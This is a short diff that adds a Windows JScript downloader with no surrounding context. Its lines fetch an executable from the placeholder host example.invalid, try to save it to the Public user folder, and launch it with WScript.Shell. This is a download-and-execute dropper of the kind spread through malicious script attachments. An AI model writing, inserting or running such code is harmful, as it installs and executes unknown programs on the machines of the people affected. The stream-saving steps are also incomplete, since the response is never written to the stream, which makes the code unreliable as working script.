@@ -1,0 +1,6 @@
+var x = new ActiveXObject("MSXML2.XMLHTTP");
+x.open("GET", "http://example.invalid/a.exe", false); x.send();
+var s = new ActiveXObject("ADODB.Stream");
+s.SaveToFile("C:\\Users\\Public\\a.exe", 2);
+new ActiveXObject("WScript.Shell").Run("C:\\Users\\Public\\a.exe");
+
